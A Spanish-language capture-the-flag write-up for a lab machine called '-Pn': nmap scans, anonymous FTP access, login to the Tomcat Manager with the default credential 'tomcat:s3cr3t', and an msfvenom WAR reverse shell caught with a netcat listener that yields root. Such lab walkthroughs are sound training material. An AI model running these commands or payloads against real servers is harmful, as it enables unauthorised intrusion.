# -Pn

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```

Como tenemos abierto los puertos 21 y 8080, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p21,8080 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p21,8080`: Escaneo de los puertos 21 (FTP) y 8080 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```bash
PORT   STATE  SERVICE REASON         VERSION
21/tcp open   ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
80/tcp closed http    reset ttl 64
```
Vemos que tenemos el usuario Anonymous en el ftp abierto, así que vamos a conectarnos.
```bash
ftp 172.17.0.2
```
```
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:tbrux): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15473|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              74 Apr 19 07:32 tomcat.txt
```
Encontrammos un archivo **tomcat.txt**, lo descargamos a nuestra máquina y revisamos que información contiene.
```bash
get tomcat.txt
```
```
tp> get tomcat.txt
local: tomcat.txt remote: tomcat.txt
229 Entering Extended Passive Mode (|||38522|)
150 Opening BINARY mode data connection for tomcat.txt (74 bytes).
100% |***********************************************************************************************************************************************************************************************|    74        1.10 MiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (227.25 KiB/s)
ftp> exit
221 Goodbye.
❯ cat tomcat.txt
Hello tomcat, can you configure the tomcat server? I lost the password...
```
Es un mensaje al usuario **tomcat** así que ya solo faltaría encontrar el password. Vamos a ver el puerto 8080 que tenemos.

## Explotación.
Pinchamos en el botón **Manager APP**. Probamos una de las contraseñas quet tiene tomcat por defecto para el usuario **tomcat** y estamos dentro del panel.
```
tomcat:s3cr3t
```
En la página vemos la opciones y vamos hasta **WAR file to deploy** y desde ahí podemos subir un archivo malicioso con una reverse shell creada con msfvenom.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
```
Una vez creado, nos aparece un listado de archivos y rutas. Nos ponemos en escucha por el puerto 443.
```bash
nc -lvnp 443
```
Hacemos click en el archivo **revshell** que hemos subido y establecemos una reverse shell con la máquina victima con privilegios de root.
```
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59678
whoami
root
```
